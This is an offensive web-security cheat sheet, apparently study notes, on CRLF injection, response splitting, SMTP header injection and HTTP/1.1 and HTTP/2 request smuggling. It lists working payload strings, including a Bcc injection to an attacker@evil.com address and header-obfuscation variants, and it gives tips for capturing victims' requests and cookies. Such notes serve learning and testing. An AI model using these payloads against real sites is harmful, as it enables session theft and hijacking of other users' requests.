

## 1. CRLF Injection & Response Splitting

Exploits `\r\n` (CRLF) to break headers and manipulate the response.

- **XSS via Response Splitting:** `%0d%0a%0d%0a<html><script>alert(1)</script></html>`
    
- **Chromium Redirect Bypass:** In `Location:`, use a leading space or null data before CRLF to break the redirect and force the browser to render the injected HTML body.
    
- **SMTP Injection:** * **Add CC/BCC:** `victim@mail.com%0d%0aBcc:attacker@evil.com`
    
    - **Overwrite Body:** `...%0d%0a%0d%0aNew Message Body Here`
        

---

## 2. HTTP Request Smuggling (HRS)

Exploits discrepancies between Frontend (FE) and Backend (BE) boundary detection.

### **Core HRS Types**

|**Type**|**FE Logic**|**BE Logic**|**Exploit**|
|---|---|---|---|
|**CL.TE**|`Content-Length`|`Transfer-Encoding`|BE stops at `0` chunk; rest is smuggled.|
|**TE.CL**|`Transfer-Encoding`|`Content-Length`|BE reads X bytes; rest is smuggled.|
|**TE.TE**|`Transfer-Encoding`|`Transfer-Encoding`|Obfuscate TE header so one server ignores it.|

### **TE.TE Obfuscation Bypasses**

|   |   |
|---|---|
|Substring match|`Transfer-Encoding: testchunked`|
|Space in Header name|`Transfer-Encoding : chunked`|
|Horizontal Tab Separator|`Transfer-Encoding:[\x09]chunked`|
|Vertical Tab Separator|`Transfer-Encoding:[\x0b]chunked`|
|Leading space|`Transfer-Encoding: chunked`|

---

## 3. HTTP/2 Smuggling (H2.TE / H2.CL)

Exploits the downgrade process where FE (HTTP/2) rewrites requests to BE (HTTP/1.1). CRLF is just "data" in H2 but becomes a "separator" in H1.1.

### **Injection Points**

1. **Header Value Injection:**
    
    - `Name: dummy` | `Value: asd\r\nTransfer-Encoding: chunked`
        
    - _Result:_ BE sees a new `Transfer-Encoding` header.
        
2. **Header Name Injection:**
    
    - `Name: dummy: asd\r\nTransfer-Encoding` | `Value: chunked`
        
    - _Result:_ FE treats the name as one string; BE splits it at the CRLF.
        
3. **Pseudo-Header Injection (`:method`, `:path`, etc.):**
    
    - `:method: POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nDummy: asd`
        
    - _Result:_ Bypasses validation checks that might only be looking at "standard" headers.
        

---

## 🛠️ Smuggling Fine-Tuning & Pro-Tips

- **The "GHOST" Test:** Smuggle a prefix with an invalid method (e.g., `GHOST / HTTP/1.1`). If the next response is a `405 Method Not Allowed`, smuggling is confirmed.
    
- **Content-Length "Sweet Spot":** * **Too small:** You won't capture enough of the victim's request.
    
    - **Too large:** The server will timeout waiting for more data.
        
- **Data Exfiltration (The "Dangling" Header):**
    
    - End your smuggled request with a header like `X-Ignore:` .
        
    - The victim's entire request (including Cookies) will be "swallowed" as the value of `X-Ignore` and sent to your backend.
        
- **Authentication:** Always include your own `Cookie` and `Host` headers inside the smuggled block to ensure the backend processes the request with your permissions.
    
